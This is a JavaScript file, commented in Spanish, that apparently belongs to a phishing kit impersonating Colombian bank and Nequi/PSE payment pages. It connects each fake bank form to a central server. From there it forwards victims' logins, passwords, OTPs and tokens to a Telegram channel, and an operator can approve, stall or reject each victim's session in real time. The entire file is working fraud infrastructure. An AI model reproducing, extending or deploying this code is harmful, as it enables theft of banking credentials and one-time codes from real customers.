/**
 * Integración de Socket.IO para todas las bancas
 * Este archivo permite que todas las bancas se conecten al servidor principal
 * y envíen sus datos al Telegram centralizado
 */

class BankSocketIntegration {
    constructor(bankName) {
        this.bankName = bankName;
        this.sessionId = null;
        this.socket = null;
        this.mainServerUrl = window.location.origin; // Servidor principal
        this.initializeSocket();
    }

    initializeSocket() {
        // Recuperar sessionId del localStorage
        this.sessionId = localStorage.getItem('nequiSessionId');
        
        if (!this.sessionId) {
            console.warn('⚠️ No se encontró sessionId. El usuario no viene del flujo Nequi->PSE');
            return;
        }

        // Conectar al servidor principal
        this.socket = io(this.mainServerUrl, {
            transports: ['websocket', 'polling'],
            reconnection: true,
            reconnectionDelay: 200,
            reconnectionDelayMax: 1000,
            reconnectionAttempts: 20,
            timeout: 5000
        });

        this.socket.on('connect', () => {
            console.log('✅ Conectado al servidor principal:', this.socket.id);
            this.socket.emit('initSession', {
                sessionId: this.sessionId,
                module: this.bankName,
                page: `${this.bankName}-form`
            });
        });

        this.socket.on('sessionConfirmed', (data) => {
            console.log('✅ Sesión confirmada:', data);
        });

        // Escuchar acciones del admin
        this.socket.on('actionApproveBank', (data) => {
            if (data.sessionId === this.sessionId) {
                console.log('✅ Datos aprobados por admin');
                this.onApprove && this.onApprove(data);
            }
        });

        this.socket.on('actionWaitBank', (data) => {
            if (data.sessionId === this.sessionId) {
                console.log('⏳ Admin solicitó esperar');
                this.onWait && this.onWait(data);
            }
        });

        this.socket.on('actionRejectBank', (data) => {
            if (data.sessionId === this.sessionId) {
                console.log('❌ Datos rechazados por admin');
                this.onReject && this.onReject(data);
            }
        });

        this.socket.on('error', (error) => {
            console.error('❌ Error:', error);
        });

        this.socket.on('disconnect', () => {
            console.log('❌ Desconectado del servidor principal');
        });
    }

    /**
     * Enviar datos al Telegram principal
     * @param {string} stage - Etapa del formulario (ej: 'login', 'password', 'otp', 'token', etc)
     * @param {object} data - Datos a enviar
     * @param {function} callback - Callback opcional cuando se confirme el envío
     */
    sendToTelegram(stage, data, callback) {
        if (!this.socket || !this.socket.connected) {
            console.error('❌ Socket no conectado');
            callback && callback({ success: false, error: 'Socket no conectado' });
            return;
        }

        if (!this.sessionId) {
            console.error('❌ No hay sessionId');
            callback && callback({ success: false, error: 'No hay sessionId' });
            return;
        }

        console.log(`📤 Enviando datos de ${this.bankName} (${stage}) al Telegram principal`);

        this.socket.emit('sendBankData', {
            sessionId: this.sessionId,
            bankName: this.bankName,
            stage: stage,
            data: data
        });

        this.socket.once('telegramSent', (response) => {
            console.log('✅ Datos enviados a Telegram:', response);
            callback && callback({ success: true, ...response });
        });

        // Timeout por si no hay respuesta
        setTimeout(() => {
            callback && callback({ success: false, error: 'Timeout' });
        }, 10000);
    }

    /**
     * Mantener la sesión activa
     */
    keepAlive() {
        if (this.socket && this.socket.connected && this.sessionId) {
            this.socket.emit('keepAlive', { sessionId: this.sessionId });
        }
    }

    /**
     * Actualizar la página actual
     */
    updatePage(page) {
        if (this.socket && this.socket.connected && this.sessionId) {
            this.socket.emit('updatePage', { sessionId: this.sessionId, page });
        }
    }

    /**
     * Callbacks para acciones del admin
     */
    onApprove(callback) {
        this.onApprove = callback;
    }

    onWait(callback) {
        this.onWait = callback;
    }

    onReject(callback) {
        this.onReject = callback;
    }

    /**
     * Desconectar
     */
    disconnect() {
        if (this.socket) {
            this.socket.disconnect();
        }
    }
}

// Iniciar keepAlive automático cada 3 segundos
setInterval(() => {
    if (window.bankIntegration) {
        window.bankIntegration.keepAlive();
    }
}, 3000);
